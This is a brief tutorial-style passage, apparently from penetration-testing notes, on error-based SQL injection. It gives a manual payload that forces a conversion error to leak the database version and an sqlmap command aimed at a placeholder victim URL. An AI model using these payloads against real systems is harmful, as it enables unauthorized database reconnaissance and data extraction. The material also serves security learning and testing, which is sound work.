Idea: Force the database to produce an error that leaks data.

Manual Payload Example:

' AND 1=CONVERT(int,(SELECT @@version))--


This forces an error, and the error message may contain DB version info.

sqlmap Command:

sqlmap -u "http://victim.com/page.php?id=1" -p id --technique=E --banner


üëâ --technique=E tells sqlmap to use Error-based injection.
